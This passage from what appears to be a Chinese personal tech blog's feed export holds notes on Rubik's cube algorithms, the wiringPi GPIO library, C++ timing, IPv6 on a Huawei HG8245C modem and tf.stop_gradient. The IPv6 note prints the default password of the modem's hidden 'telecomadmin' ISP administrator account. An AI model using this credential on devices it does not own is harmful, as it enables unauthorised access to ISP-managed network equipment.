<h2 id="第二步中间层的复原"><a href="#第二步中间层的复原" class="headerlink" title="第二步中间层的复原"></a>第二步中间层的复原</h2><p>第二步中间层的复原分成两种情况，如图3和图4所示。</p>
<p align="center">
    <img src="images/left.png" width="40%" alt="中间层左侧边块的复原"/>
</p>
<center>U' L' U L U F U' F'</center>
<center>图3 中间层左侧边块的复原</center>
<p align="center">
    <img src="images/right.png" width="40%" alt="中间层右侧边块的复原"/> 
</p>
<center>U R U' R' U' F' U F</center>
<center>图4 中间层右侧边块的复原</center>

<h2 id="第三步顶层的复原"><a href="#第三步顶层的复原" class="headerlink" title="第三步顶层的复原"></a>第三步顶层的复原</h2><p>第三步最后一层的还原遇到的情况很多，目前我也没有完全搞明白，下面简单介绍最后一层复原的步骤，但并不能保证一定能复原。</p>
<h3 id="形成顶层十字"><a href="#形成顶层十字" class="headerlink" title="形成顶层十字"></a>形成顶层十字</h3><p align="center">
    <img src="images/top-cross.png" width="40%" alt="顶层十字的复原"/>
</p>
<center>F R U R' U' F'</center>
<center>图5 顶层十字的复原</center>

<p>根据顶层状态，多次使用公式F R U R’ U’ F’，以形成顶部十字。</p>
<h3 id="交换顶层十字边块"><a href="#交换顶层十字边块" class="headerlink" title="交换顶层十字边块"></a>交换顶层十字边块</h3><p>交换顶层边块，使其边缘颜色保持一致，如图6所示。</p>
<p align="center">
    <img src="images/top-cross-color.png" width="60%" alt="交换顶层边块"/>
</p>
<center>R U R' U R U2 R' U</center>
<center>图6 交换顶层边块</center>

<h3 id="交换顶层角块"><a href="#交换顶层角块" class="headerlink" title="交换顶层角块"></a>交换顶层角块</h3><p>现在只剩下黄色的角落，将分两个步骤进行。首先，我们必须以定位它们，在下一步骤中定向它们。</p>
<h4 id="定位顶层角块"><a href="#定位顶层角块" class="headerlink" title="定位顶层角块"></a>定位顶层角块</h4><p align="center">
    <img src="images/cycle-yellow-corners.svg" width="60%" alt="定位顶层角块"/>
</p>
<center>U R U' L' U R' U' L</center>
<center>图7 定位顶层角块</center>

<p>此算法循环上面图像上顶层的角块，但标有“OK”的前右上角将保留在原位。</p>
<h4 id="定向顶层角块"><a href="#定向顶层角块" class="headerlink" title="定向顶层角块"></a>定向顶层角块</h4><p>现在顶层角块都已定位，但角块颜色与周围面不一致，使用如图8所示算法一个一个旋转顶层角块。</p>
<p align="center">
    <img src="images/orient-yellow-corners.svg" width="60%" alt="定向顶层角块"/>
</p>
<center>R' D' R D</center>
<center>图8 定向顶层角块</center>

<p>首先在突出显示的右前方点，拿着你的手有一个不对准的黄色角落的立方体（见图8）。重复R’ D’ R D算法，直到这一块在它的地方与黄色贴纸。</p>
<p>只将一面向上转动，将另一个错误的黄色拐角移到突出显示的点，并重复R’ D’ R D算法，直到这个黄色面被解决。</p>
<p>移动其他未对齐的黄色边角，一个一个到标记的点，并做公式，直到所有的黄色角落都被解决。</p>
<h4 id="顶层最后两个角块位置对颜色不对的复原方法"><a href="#顶层最后两个角块位置对颜色不对的复原方法" class="headerlink" title="顶层最后两个角块位置对颜色不对的复原方法"></a>顶层最后两个角块位置对颜色不对的复原方法</h4><p>将色向不对的两个角放在顶层左手边位置,用公式(R;U;R’;U;R;U2;R’;)(L’;U’;L;U’;L’;U2;L;)。</p>
<p>做一遍如果不对的话,就再做一遍就行了.</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cube3x3.com/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E9%AD%94%E6%96%B9/" target="_blank" rel="noopener">如何解决魔方 魔方</a>,by cub3x3.</li>
<li><a href="https://zhidao.baidu.com/question/446648519.html" target="_blank" rel="noopener">三阶魔方解法最后两个角如何复原?位置是对的只是颜色对不住？</a>,by qiuyuhanfeng.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%AD%94%E6%96%B9" target="_blank" rel="noopener">魔方</a>,by wikipedia.</li>
<li><a href="https://site.douban.com/107925/widget/notes/4567539/note/171635813/" target="_blank" rel="noopener">暴强！！！只需7步，任何魔方6面皆可还原！</a>,by 飞天飘渺.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>wiringPi学习笔记</title>
    <url>/2018/11/24/wiringPi%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>wiringPi 库是由 Gordon Henderson 所编写并维护的一个用 C 语言写成的类库。起初,主要是作为 BCM2835 芯片的 GPIO 库。而现在,已经非常丰富,除了 GPIO 库,还包括了I2C 库、SPI 库、UART 库和软件 PWM 库等。</p>
<p>由于其与 Arduino 的“wiring”系统较为类似,故以此命名。它是采用 GNU LGPLv3许可证的,可以在 C 或 C++上使用,而且在其他编程语言上也有对应的扩展。</p>
<p>wiringPi 库包含了一个命令行工具 gpio,它可以用来设置 GPIO 管脚,可以用来读写GPIO 管脚,甚至可以在 Shell 脚本中使用来达到控制 GPIO 管脚的目的。</p>
<h1 id="下载、编译和测试wiringPi"><a href="#下载、编译和测试wiringPi" class="headerlink" title="下载、编译和测试wiringPi"></a>下载、编译和测试wiringPi</h1><ol>
<li>下载并编译wiringPi<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;git.drogon.net&#x2F;wiringPi</span><br><span class="line">cd wiringPi</span><br><span class="line">.&#x2F;build</span><br></pre></td></tr></table></figure></li>
<li>测试wiringPi是否安装成功<br>打开命令终端，可以通过 gpio 命令来检查 wiringPi 是否安装成功，运行下面的命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpio –v</span><br><span class="line">gpio readall</span><br></pre></td></tr></table></figure>
运行上述第二条命令将得到树莓派的 GPIO 接口之间的对应关系。</li>
</ol>
<p align="center">
    <img src="images/gpio_map.png" width="100%" alt="gpio管脚定义"/>
</p>

<h1 id="使用wiringPi"><a href="#使用wiringPi" class="headerlink" title="使用wiringPi"></a>使用wiringPi</h1><p>在使用wiringPi之前，应首先对wiringPi进行设置。</p>
<h2 id="wiringPi设置函数"><a href="#wiringPi设置函数" class="headerlink" title="wiringPi设置函数"></a>wiringPi设置函数</h2><p>wiringPi设置函数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int wiringPiSetup (void) ;</span><br><span class="line">int wiringPiSetupGpio (void) ;</span><br><span class="line">int wiringPiSetupPhys (void) ;</span><br><span class="line">int wiringPiSetupSys (void) ;</span><br></pre></td></tr></table></figure>

<h3 id="wiringPiSetup-void-函数"><a href="#wiringPiSetup-void-函数" class="headerlink" title="wiringPiSetup (void) 函数"></a>wiringPiSetup (void) 函数</h3><p>该函数初始化wiringPi，假定程序将使用wiringPi的管脚定义图。具体管脚映射，可以通过gpio readall命令来查看。该函数需要root权限。</p>
<h3 id="wiringPiSetupGpio-void-函数"><a href="#wiringPiSetupGpio-void-函数" class="headerlink" title="wiringPiSetupGpio (void) 函数"></a>wiringPiSetupGpio (void) 函数</h3><p>该函数与wiringPiSetup函数类似，区别在于假定程序使用的是Broadcom的GPIO管脚定义，而没有重新映射。该函数需要root权限，需要注意v1和v2版本的树莓派是不同的。</p>
<h3 id="wiringPiSetupPhys-void-函数"><a href="#wiringPiSetupPhys-void-函数" class="headerlink" title="wiringPiSetupPhys (void) 函数"></a>wiringPiSetupPhys (void) 函数</h3><p>该函数与wiringPiSetup函数类似，区别在于允许程序使用物理管脚定义，但仅支持P1接口。该函数需要root权限。</p>
<h3 id="wiringPiSetupSys-void-函数"><a href="#wiringPiSetupSys-void-函数" class="headerlink" title="wiringPiSetupSys (void) 函数"></a>wiringPiSetupSys (void) 函数</h3><p>该函数初始化wiringPi，使用/sys/class/gpio接口，而不是直接通过操作硬件来实现。该函数可以使用非root权限用户，在此种模式下的管脚号是Broadcom的GPIO管脚号，不wiringPiSetupGpio函数类似，需要注意v1和v2板子的不同。</p>
<p>在此种模式下，在运行程序前，您需要通过/sys/class/gpio接口导出要使用的管脚。你可以在一个独立的shell脚本中来导出将要使用的管脚，或者使用系统的system()函数来调用GPIO命令。</p>
<h2 id="软件-PWM-库"><a href="#软件-PWM-库" class="headerlink" title="软件 PWM 库"></a>软件 PWM 库</h2><p>wiringPi 中包含了一个软件驱动的 PWM (Pulse Width Modulation, 脉冲宽度调节)处理库，可以在任意的树莓派 GPIO 上输出 PWM 信号。</p>
<p>但是也有一些限制。为了维护较低的 CPU 使用率，最小的脉冲宽度是 100 微秒，结合默认的建议值为 100，那么最小的 PWM 频率是 100Hz。如果需要更高的频率，可以使用更低的数值。如果看脉冲宽度的驱动代码，你会发现低于 100 微秒，wiringPi 是在软件循环中实现的，这就意味着 CPU 使用率将会动态增加，从而使得控制其他管脚成为不可能。</p>
<p>需要注意的是，当其他程序运行在更高的实时的优先级，Linux 可能会影响产生信号的精度。尽管有这些限制，控制 LED 或电机还是可以的。</p>
<p>使用前,需要包含相应的文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;wiringPi.h&gt;</span><br><span class="line">#include &lt;softPwm.h&gt;</span><br></pre></td></tr></table></figure>

<p>当编译程序时,必须加上 pthread 库,如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc –o myprog myprog.c –lwiringPi –lpthread</span><br></pre></td></tr></table></figure>
<p>必须使用 wiringPiSetup()、 wiringPiSetupGpio()或者 wiringPiSetupPhys()函数来初始化 wiringPi。</p>
<p>wiringPiSetupSys()是不够快的，因此，必须使用 sudo 命令来运行程序。</p>
<h3 id="softPwmCreate-函数"><a href="#softPwmCreate-函数" class="headerlink" title="softPwmCreate 函数"></a>softPwmCreate 函数</h3><p>该函数的原型为：int softPwmCreate(int pin, int initialValue, int pwmRange);</p>
<p>该函数将会创建一个软件控制的 PWM 管脚。可以使用任何一个 GPIO 管脚 , pwmRange 参数可以为 0(关)~100(全开)。</p>
<p>返回值为 0，代表成功，其他值，代表失败。</p>
<h3 id="softPwmWrite-函数"><a href="#softPwmWrite-函数" class="headerlink" title="softPwmWrite 函数"></a>softPwmWrite 函数</h3><p>该函数的原型为: void softPwmWrite(int pin, int value);</p>
<p>该函数将会更新指定管脚的 PWM 值。value 参数的范围将会被检查,如果指定的管脚之前没有通过 softPwmCreate 初始化,将会被忽略。</p>
<h2 id="wiringPi核心函数"><a href="#wiringPi核心函数" class="headerlink" title="wiringPi核心函数"></a>wiringPi核心函数</h2><h3 id="pinMode函数"><a href="#pinMode函数" class="headerlink" title="pinMode函数"></a>pinMode函数</h3><p>该函数的原型为: void pinMode(int pin, int mode);</p>
<p>使用该函数可以将某个管脚讴置为 INPUT(输入)、 OUTPUT(输出)、 PWM_OUTPUT(脉冲输出)或者 GPIO_CLOCK(GPIO 时钟)。</p>
<p>需要注意的是仅有管脚 1(BCM_GPIO 18)支持 PWM_OUTPUT 模式,仅有管脚 7(BCM_GPIO 4)支持 CLOCK 输出模式。</p>
<p>在 Sys 模式下,返个函数没有影响。你可以通过调用 gpio 命令在 shell 脚本中来设置管脚的模式。</p>
<h3 id="digitalWrite-函数"><a href="#digitalWrite-函数" class="headerlink" title="digitalWrite 函数"></a>digitalWrite 函数</h3><p>该函数的原型为: void digitalWrite(int pin, int value);</p>
<p>使用该函数可以向指定的管脚写入 HIGH(高)或者 LOW(低),写入前,需要将管脚设置为输出模式。</p>
<p>wiringPi 将任何的非 0 值作为 HIGH (高)来对待,因此, 0 是唯一能够代表 LOW (低)的数值。</p>
<h3 id="digitalRead-函数"><a href="#digitalRead-函数" class="headerlink" title="digitalRead 函数"></a>digitalRead 函数</h3><p>该函数原型： digitalRead(int pin);</p>
<p>使用该函数可以读取指定管脚的值，读取到的值为HIGH（1）或者LOW（0），该值取决于该管脚的逻辑电平的高低。</p>
<h2 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h2><h3 id="delay-函数"><a href="#delay-函数" class="headerlink" title="delay 函数"></a>delay 函数</h3><p>该函数的原型为：void delay(unsigned int howLong);</p>
<p>该函数将会中断程序执行至少 howLong 毫秒。因为 Linux 是多任务的原因，中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 49 天。</p>
<h3 id="delayMicroseconds-函数"><a href="#delayMicroseconds-函数" class="headerlink" title="delayMicroseconds 函数"></a>delayMicroseconds 函数</h3><p>该函数的原型为：void delayMicroseconds(unsigned int howLong);</p>
<p>该函数将会中断程序执行至少 howLong 微秒。因为 Linux 是一个多任务的系统，因此中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 71分钟。</p>
<p>延迟低于100 微秒，将会使用硬件循环来实现；超过 100 微秒，将会使用系统的nanosleep()函数来实现。</p>
<h2 id="优先级-时间-线程"><a href="#优先级-时间-线程" class="headerlink" title="优先级/时间/线程"></a>优先级/时间/线程</h2><h3 id="wiringPiISR-函数"><a href="#wiringPiISR-函数" class="headerlink" title="wiringPiISR 函数"></a>wiringPiISR 函数</h3><p>该函数的原型为：int wiringPiISR(int pin, int edgeType, void (*function)(void));</p>
<p>该函数会在指定管脚注册一个中断事件的函数，当指定管脚发生中断事件时，会自动调用该函数。</p>
<p>edgeType 参数可以为 INT_EDGE_FALLING（下降沿）、INT_EDGE_RISING（上升沿）、INT_EDGE_BOTH（上升沿或者下降沿）或者 INT_EDGE_SETUP。如果是INT_EDGE_SETUP，将不会初始化该管脚，因为它假定已经在别处设置过该管脚（比如使用 gpio 命令），但是，如果指定另外的类型，指定管脚将会被导出并初始化。完成此操作使用的是 gpio 命令，所以，必须保证 gpio 命令是可用的。</p>
<p>注册函数在中断触发时，将会被调用。在调用注册函数前，中断事件将会从分配器中清除，所以，即使有后续的触发发生，在处理完成前，也不会错过此次触发。（当然，如果在正在处理触发时，有不止一个的中断发生，已经发生的中断将会被忽略）。</p>
<h2 id="I2C库"><a href="#I2C库" class="headerlink" title="I2C库"></a>I2C库</h2><p>wiringPi 包含了一个 I2C 库，来让您能够更轻松的使用树莓派的板上 I2C 接口。在使用 I2C 接口之前，您可能需要使用 gpio 命令来加载 I2C 驱劢到内核中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpio load i2c</span><br></pre></td></tr></table></figure>
<p>如果你需要的波特率是 100Kbps，那么您可以使用如下命令设置波特率为1000Kbps：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpio load i2c 1000</span><br></pre></td></tr></table></figure>

<p>使用 I2C 库，需要包含 wiringPiI2C.h 文件。并且编译时，同样需要使用-lwiringPi 来连接到 wiringPi 库。</p>
<p>您仍然可以使用标准的系统命令来检测 I2C 设备，如 i2cdetect 命令，需要注意的是，在 v1 版本的树莓派上是 0，v2 版本上是 1，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls &#x2F;dev&#x2F;i2c-1</span><br><span class="line"># 注意i2c-1后面的编码1</span><br><span class="line">i2cdetect –y 1</span><br></pre></td></tr></table></figure>

<p>当然，您也可以使用 gpio 命令来调用 i2cdetect 命令，从而检测 I2C 讴备，返样就不用在乎您的树莓派版本了，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpio i2cdetect</span><br></pre></td></tr></table></figure>

<h3 id="wiringPiI2CSetup-函数"><a href="#wiringPiI2CSetup-函数" class="headerlink" title="wiringPiI2CSetup 函数"></a>wiringPiI2CSetup 函数</h3><p>该函数的原型为：int wiringPiI2CSetup(int devId);</p>
<p>该函数使用指定设备标示号来初始化 I2C 系统。参数 devId 是 I2C 设备的地址，可以通过 i2cdetect 命令可以查到该地址。该函数会获取树莓派的版本并依据此打开/dev 目录下对应的讴备。</p>
<p>返回值是标准的 Linux 文件句柄，如果有错误，则返回-1。</p>
<p>比如，流行的 MCP23017 GPIO 扩展器的设备 ID 是 0x20，所以，你需要将这个数值传递给 wiringPiI2CSetup()。</p>
<h3 id="wiringPiI2CWrite-函数"><a href="#wiringPiI2CWrite-函数" class="headerlink" title="wiringPiI2CWrite 函数"></a>wiringPiI2CWrite 函数</h3><p>该函数的原型为：int wiringPiI2CWrite(int fd, int data)；</p>
<p>简单的设备写操作。一些设备可以接受数据，而不需要发送任何内部寄存器地址。</p>
<h3 id="wiringPiI2CRead-函数"><a href="#wiringPiI2CRead-函数" class="headerlink" title="wiringPiI2CRead 函数"></a>wiringPiI2CRead 函数</h3><p>该函数的原型为：int wiringPiI2CRead(int fd)；</p>
<p>简单的设备读操作。一些设备可以直接读取，而不需要发送任何寄存器地址。</p>
<h3 id="wiringPiI2CWriteReg8-和-wiringPiI2CWriteReg16-函数"><a href="#wiringPiI2CWriteReg8-和-wiringPiI2CWriteReg16-函数" class="headerlink" title="wiringPiI2CWriteReg8 和 wiringPiI2CWriteReg16 函数"></a>wiringPiI2CWriteReg8 和 wiringPiI2CWriteReg16 函数</h3><p>该函数的原型为：</p>
<p>int wiringPiI2CWriteReg8(int fd, int reg, int data); int wiringPiI2CWriteReg16(int fd, int reg, int data);</p>
<p>使用返两个函数，可以写一个 8 位或 16 位数值到指定的设备寄存器。</p>
<h3 id="wiringPiI2CReadReg8-和-wiringPiI2CReadReg16-函数"><a href="#wiringPiI2CReadReg8-和-wiringPiI2CReadReg16-函数" class="headerlink" title="wiringPiI2CReadReg8 和 wiringPiI2CReadReg16 函数"></a>wiringPiI2CReadReg8 和 wiringPiI2CReadReg16 函数</h3><p>该函数的原型为：</p>
<p>int wiringPiI2CReadReg8(int fd, int reg); int wiringPiI2CReadReg16(int fd, int reg);</p>
<p>使用返两个函数，可以从指定的设备寄存器读取一个 8 位或 16 位的数值。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.lxx1.com/树莓派-wiringpi-用户手册" target="_blank" rel="noopener">树莓派 wiringPi 用户手册
</a>, by 科技爱好者博客</li>
<li><a href="http://wiringpi.com/" target="_blank" rel="noopener">Wiring Pi</a></li>
<li><a href="https://hanbingyan.github.io/2016/03/07/pthread_on_linux/" target="_blank" rel="noopener">Pthreads 入门教程</a>,by hanbingyan.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>不同语言的计时方法</title>
    <url>/2019/10/27/%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E7%9A%84%E8%AE%A1%E6%97%B6%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>剖析代码性能时通常需要计时。下面记录不同语言的各种计时方法。</p>
<h1 id="C-计时方法"><a href="#C-计时方法" class="headerlink" title="C++计时方法"></a>C++计时方法</h1><p>传统计时方法的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;ctime&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">clock_t start &#x3D; clock();</span><br><span class="line">&#x2F;&#x2F; do something...</span><br><span class="line">clock_t end   &#x3D; clock();</span><br><span class="line">cout &lt;&lt; &quot;花费了&quot; &lt;&lt; (double)(end - start) &#x2F; CLOCKS_PER_SEC &lt;&lt; &quot;秒&quot; &lt;&lt; endl;</span><br></pre></td></tr></table></figure>

<p>C++11 标准的”最佳计时方法“的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;chrono&gt;   </span><br><span class="line">using namespace std;</span><br><span class="line">using namespace chrono;</span><br><span class="line"></span><br><span class="line">auto start &#x3D; system_clock::now();</span><br><span class="line">&#x2F;&#x2F; do something...</span><br><span class="line">auto end   &#x3D; system_clock::now();</span><br><span class="line">auto duration &#x3D; duration_cast&lt;microseconds&gt;(end - start);</span><br><span class="line">cout &lt;&lt;  &quot;花费了&quot; </span><br><span class="line">     &lt;&lt; double(duration.count())</span><br><span class="line">     &lt;&lt; &quot;微秒&quot; &lt;&lt; endl;</span><br></pre></td></tr></table></figure>

<h1 id="Python计时方法"><a href="#Python计时方法" class="headerlink" title="Python计时方法"></a>Python计时方法</h1><p>在Jupyter Notebook中，计时使用一个magic command：%timeit。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/u013390476/article/details/50209603" target="_blank" rel="noopener">C++11 新的计时方法——std::chrono 大法好</a>,by sicolex.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>中国电信光猫华为HG8245C开启IPV6的方法</title>
    <url>/2018/11/11/%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%85%89%E7%8C%AB%E5%8D%8E%E4%B8%BAHG8245C%E5%BC%80%E5%90%AFIPV6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>据报道，目前中国电信已成功创建了IP骨干网全面支持IPv6，并且在4G网络开启了IPv6服务，在100多个城域网提供了IPv6服务<sup>[1]</sup>。那么如何使家里宽带用上IPv6服务呢？这个问题最关键是设置入户光猫使其支持IPv6。以如何光猫华为HG8245C为例，说明设置过程。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="IPv6简介"><a href="#IPv6简介" class="headerlink" title="IPv6简介"></a>IPv6简介</h2><p>网际协议第6版（英文：Internet Protocol version 6，缩写：IPv6）是网际协议（IP）的最新版本，用作互联网的网上层协议，用它来取代IPv4主要是为了解决IPv4地址枯竭问题，不过它也在其他很多方面对IPv4有所改进。</p>
<h2 id="IPv6格式"><a href="#IPv6格式" class="headerlink" title="IPv6格式"></a>IPv6格式</h2><p>IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。</p>
<p>同时IPv6在某些条件下可以省略：</p>
<ol>
<li>每项数字前导的0可以省略，省略后前导数字仍是0则继续，例如下组IPv6是等价的。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2001:0DB8:02de:0000:0000:0000:0000:0e13</span><br><span class="line">2001:DB8:2de:0000:0000:0000:0000:e13</span><br><span class="line">2001:DB8:2de:000:000:000:000:e13</span><br><span class="line">2001:DB8:2de:00:00:00:00:e13</span><br><span class="line">2001:DB8:2de:0:0:0:0:e13</span><br></pre></td></tr></table></figure></li>
<li>可以用双冒号“::”表示一组0或多组连续的0，但只能出现一次。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 2001:DB8:2de:0:0:0:0:e13</span><br><span class="line">   2001:DB8:2de::e13</span><br><span class="line">* 2001:0DB8:0000:0000:0000:0000:1428:57ab</span><br><span class="line">   2001:0DB8:0000:0000:0000::1428:57ab</span><br><span class="line">   2001:0DB8:0:0:0:0:1428:57ab</span><br><span class="line">   2001:0DB8:0::0:1428:57ab</span><br><span class="line">   2001:0DB8::1428:57ab</span><br></pre></td></tr></table></figure></li>
<li>如果这个地址实际上是IPv4的地址，后32位可以用10进制数表示；因此::ffff:192.168.89.9 相等于::ffff:c0a8:5909。</li>
</ol>
<h2 id="IPv6地址分类"><a href="#IPv6地址分类" class="headerlink" title="IPv6地址分类"></a>IPv6地址分类</h2><h3 id="常用地址"><a href="#常用地址" class="headerlink" title="常用地址"></a>常用地址</h3><p>IPv6地址可分为三种:</p>
<ul>
<li>单播（unicast）地址：单播地址标示一个网上接口。协议会把送往地址的数据包送往给其接口。</li>
<li>任播（anycast）地址: Anycast是IPv6特有的数据发送方式，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。</li>
<li>多播（multicast）地址: 多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。</li>
</ul>
<h3 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h3><h4 id="未指定地址"><a href="#未指定地址" class="headerlink" title="未指定地址"></a>未指定地址</h4><ul>
<li>::/128－所有比特皆为零的地址称作未指定地址。</li>
</ul>
<h4 id="链路本地地址"><a href="#链路本地地址" class="headerlink" title="链路本地地址"></a>链路本地地址</h4><ul>
<li>::1/128－是一种单播绕回地址。如果一个应用程序将数据包送到此地址，IPv6堆栈会转送这些数据包绕回到同样的虚拟接口（相当于IPv4中的127.0.0.1/8）。</li>
<li>fe80::/10－这些链路本地地址指明，这些地址只在区域连线中是合法的，这有点类似于IPv4中的169.254.0.0/16。</li>
</ul>
<h4 id="唯一区域位域"><a href="#唯一区域位域" class="headerlink" title="唯一区域位域"></a>唯一区域位域</h4><ul>
<li>fc00::/7－唯一区域地址（ULA，unique local address）只可在一群网站中绕送。</li>
</ul>
<h4 id="多播地址"><a href="#多播地址" class="headerlink" title="多播地址"></a>多播地址</h4><ul>
<li>ff00::/8－这个前置表明定义在”IP Version 6 Addressing Architecture”（RFC 4291）中的多播地址[</li>
</ul>
<h4 id="IPv4转译地址"><a href="#IPv4转译地址" class="headerlink" title="IPv4转译地址"></a>IPv4转译地址</h4><ul>
<li>::ffff:x.x.x.x/96－用于IPv4映射地址。</li>
<li>2001::/32－用于Teredo隧道。</li>
<li>2002::/16－用于6to4。</li>
</ul>
<h2 id="IPv6优势"><a href="#IPv6优势" class="headerlink" title="IPv6优势"></a>IPv6优势</h2><ul>
<li>巨大的地址空间</li>
<li>新的协议头格式，加快路由速度</li>
<li>有效地、分级的寻址和路由结构</li>
<li>有状态和无状态的地址配置</li>
<li>内置的安全性</li>
<li>更好的支持Qos</li>
<li>用新协议处理邻节点的交互</li>
<li>可扩展性</li>
</ul>
<h1 id="设置华为光猫HG8245C开启IPv6步骤"><a href="#设置华为光猫HG8245C开启IPv6步骤" class="headerlink" title="设置华为光猫HG8245C开启IPv6步骤"></a>设置华为光猫HG8245C开启IPv6步骤</h1><p>在设置华为光猫HG8245C开启IPv6之前，一是要确保所在电信已支持IPv6服务。二是获取华为HG8245C隐藏管理员帐号telecomadmin的密码，通常为<strong>nE7jA%5m</strong>。</p>
<p>以隐藏管理员帐号telecomadmin登录华为HG8245C的Web管理控制台后，选择“网络-&gt;宽带设置”，选择连接”2_INTERNET_R_VID_”,设置协议类型为“IPv4/IPv6”，设置前缀获取方式为“DHCPv6-PD”,再点应用即可。</p>
<p align="center">
    <img src="images/open_ipv6.png" width="90%" alt="开启IPv6"/>
</p>

<p>在Debian Linux中打开终端，输入如下命令或者浏览网站<a href="http://test-ipv6.com/验证IPv6。" target="_blank" rel="noopener">http://test-ipv6.com/验证IPv6。</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1&#x2F;128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link&#x2F;ether e4:70:b8:30:f1:5b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.1.100&#x2F;24 brd 192.168.1.255 scope global dynamic noprefixroute wlan0</span><br><span class="line">       valid_lft 251566sec preferred_lft 251566sec</span><br><span class="line">    inet6 240e:bc:e60:3d00:ea5b:f704:6b65:fab1&#x2F;64 scope global dynamic noprefixroute </span><br><span class="line">       valid_lft 258984sec preferred_lft 172584sec</span><br><span class="line">    inet6 fe80::4e2c:4397:f016:3eb4&#x2F;64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.c114.com.cn/news/117/a1059059.html" target="_blank" rel="noopener">中国电信：IPv6在线用户已超千万 年底将完成端到端服务能力</a>.2018-07-16</li>
<li>维基百科.<a href="https://zh.wikipedia.org/wiki/IPv6" target="_blank" rel="noopener">IPv6</a></li>
<li><a href="http://network.51cto.com/art/201006/204898.htm" target="_blank" rel="noopener">掌握IPv6网络协议的优势</a>,2010-06-10</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>tf.stop_gradient梯度截断作用</title>
    <url>/2022/02/24/tf-stop-gradient%E6%A2%AF%E5%BA%A6%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<p>可能会有这样的场景, 即我们可能只需要训练网络的特定部分, 然后网络的其余部分则保持未之前的状态(不进行梯度更新). tf.stop_gradient 正是为了处理这一情景的. 即在 tf.stop_gradient 中执行任何操作都不会导致在 BP 过程中梯度的更新.</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.codeleading.com/article/57022080493/" target="_blank" rel="noopener">【Tensorflow】— tf.stop_gradient梯度截断作用</a>,by 代码先锋网. </li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>二维码原理及生成</title>
    <url>/2020/05/09/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
